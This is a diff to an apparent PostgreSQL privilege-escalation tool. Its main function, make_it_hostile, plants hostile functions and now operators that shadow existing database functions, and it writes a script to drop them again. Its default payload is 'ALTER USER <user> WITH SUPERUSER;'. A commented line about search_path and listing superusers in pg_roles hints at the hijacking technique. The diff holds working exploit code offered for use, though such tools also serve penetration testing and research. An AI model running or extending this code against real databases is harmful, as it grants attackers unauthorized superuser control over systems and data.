@@ -20,6 +20,11 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
     print_ok("Starting ... \n")
     c_functions = get_candidate_functions(db)
     print("[ * ] %s interesting functions have been identified" % len(c_functions))
+    # @TODO
+    print("[ * ] Detecting operators")
+    for cc in c_functions:
+        cc.get_operator()
+
     for df in c_functions:
         conv_types = convert_types(df.params_type)
         for artype in conv_types:
@@ -78,7 +83,10 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
 
         print("[ * ] Done!")
         with open(os.path.join(out_dir, "drop_functions.sql"), "w") as f:
-            f.write("\n".join([f"{f.drop_query};" for f in created_functions]))
+            for fnc in created_functions:
+                if fnc.operator and fnc.operator_created:
+                    f.write("%s;\n" % fnc.drop_query_operator)
+                f.write("%s;\n" % fnc.drop_query)
 
     print_ok("\n%d functions have been created" % len(created_functions))
 
@@ -153,6 +161,7 @@ def main():
 
     exploit_payload = args.exploit_payload or f"ALTER USER {args.db_username} WITH SUPERUSER;"
 
+    # db.query("set search_path to '$user',postgres")  # @TODO search all superusers SELECT * FROM pg_roles where rolsuper;
     try:
         make_it_hostile(
             db,
